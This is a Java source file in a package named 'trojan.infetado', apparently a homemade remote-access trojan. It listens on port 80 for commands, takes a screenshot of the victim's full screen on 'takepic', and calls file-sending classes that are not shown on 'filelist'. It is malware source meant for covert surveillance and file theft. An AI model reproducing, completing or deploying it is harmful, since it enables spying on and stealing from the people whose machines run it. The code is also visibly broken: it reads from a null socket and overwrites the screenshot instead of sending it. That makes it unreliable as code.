package trojan.infetado;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import javax.imageio.ImageIO;
import network.*;

public class Main {

    public static void main(String[] args) throws AWTException, IOException {

        final String pic = "takepic";
        final String off = "off";
        final String file = "filelist";

        DataInputStream din;

        ServerSocket servsock = new ServerSocket(80);
        Socket sock = servsock.accept();

        Socket socket = null;
        InputStream in = null;
        OutputStream out = null;

        din = new DataInputStream(sock.getInputStream());

        String msg = "on";
        do {

            msg = din.readUTF();

            if (msg.equals(pic)) {
                FileInputStream fis = null;
                BufferedInputStream bis = null;
                OutputStream os = null;

                Robot rob = new Robot();
                BufferedImage image = rob.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ImageIO.write(image, "jpg", new File("screenshot.jpg"));
                
                in = socket.getInputStream();
                out = new FileOutputStream("screenshot.jpg");

                byte[] bytes = new byte[16*1024];

                int count;
                while ((count = in.read(bytes)) > 0) {
                    out.write(bytes, 0, count);
                }
                
            } else if (msg.equals(file)) {
                SendArray sa = new SendArray();
                SendFile sf = new SendFile();
            }

        } while (!msg.equals(off));

    }

}
